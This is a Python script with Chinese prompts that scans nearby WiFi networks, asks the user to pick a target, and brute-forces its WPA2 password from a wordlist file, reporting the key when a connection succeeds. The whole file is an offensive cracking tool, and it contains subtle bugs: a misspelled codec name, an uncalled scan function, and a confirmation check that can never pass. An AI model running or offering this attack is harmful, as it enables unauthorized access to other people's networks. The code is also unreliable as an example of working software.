import pywifi
import time
from pywifi import const

def wifi_scan():
    wifi=pywifi.PyWiFi()
    interface=wifi.interfaces()[0]
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('\r扫描可用WiFi中,请稍后...'+str(3-i),end='')
    print('\r扫描完成!\n'+'-'*38)
    bss=interface.scan.results()
    wifi_name_set=set()
    for w in bss:
        wifi_name_and_signal=(100+w.signal,w.ssid.encode('raw_unicode_escage').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    wifi_name_list=list(wifi_name_set)
    wifi_name_list=sorted(wifi_name_list,key=lambda a:a[0],reverse=True)
    num=0
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num,wifi_name_list[num][0],wifi_name_list[num][1]))
        num+=1
    print('-'*38)
    return wifi_name_list

def wifi_password_crack(wifi_name):
    wifi_dic_path=input('wp.txt')
    with open('wp.txt','r') as f:
        print(f)
        for pwd in f:
            pwd=pwd.strip('\n')
            wifi=pywifi.PyWiFi()
            interface=wifi.interfaces()[0]
            interface.disconnect()
            while interface.status() == 4:
                pass
            profile=pywifi.Profile()
            profile.ssid=wifi_name
            profile.auth=const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher=const.CIPHER_TYPE_CCMP
            profile.key=pwd
            interface.remove_all_network_profiles()
            tmp_profile=interface.add_network_profile(profile)
            interface.connect(tmp_profile)
            start_time=time.time()
            while time.time()-start_time < 1.5:
                if interface.status() == 4:
                    print(f'\r连接成功!密码为:{pwd}')
                    exit(0)
                else:
                    print(f'\r正在利用密码{pwd}尝试攻防',end='')


def main():
    exit_flag=0
    target_num=-1
    while not exit_flag:
        try:
            print('wifi密码攻防'.center(35,'-'))
            wifi_list=wifi_scan
            choose_exit_flag=0
            while not choose_exit_flag:
                try:
                    target_num=int(input('请选择你要攻防的wifi:'))
                    if target_num in range(len(wifi_list)):
                        while not choose_exit_flag:
                            try:
                                choose=str(input(f'你选择要攻防的wifi名称是:{wifi_list[target_num][1]},确定吗?(Y/N)'))
                                if choose.lower() == 'Y':
                                    choose_exit_flag=1
                                elif choose.lower() == 'n':
                                    break
                                else:
                                    print('只能输入y/n哦')
                            except ValueError:
                                print('只能输入y/n哦')
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('请从新输入')
                except ValueError:
                    print('只能输入数字哦')
            wifi_password_crack(wifi_list[target_num][1])
            print('-'*38)
            exit_flag=1
        except Exception as e:
            print(e)
            raise e
                            

if __name__ == '__main__':
    main()